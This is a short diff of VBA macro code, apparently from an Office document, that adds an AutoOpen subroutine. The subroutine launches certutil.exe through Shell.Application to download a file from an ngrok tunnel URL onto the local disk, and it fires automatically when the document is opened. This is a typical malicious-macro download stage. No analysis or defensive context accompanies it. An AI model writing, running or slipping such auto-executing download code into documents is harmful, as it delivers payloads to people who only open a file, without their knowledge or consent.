@@ -58,5 +58,13 @@ Sub AutoOpen()
 End Sub
 
 
+Sub AutoOpen()
+    Dim sh
+    Set sh = CreateObject("Shell.Application")
+    sh.ShellExecute "certutil.exe", _
+        "-urlcache -split -f https://ce12-117-232-57-2.ngrok-free.app/new.html C:\tester\new.html", _
+        "", "", 1
+End Sub
+
 
 
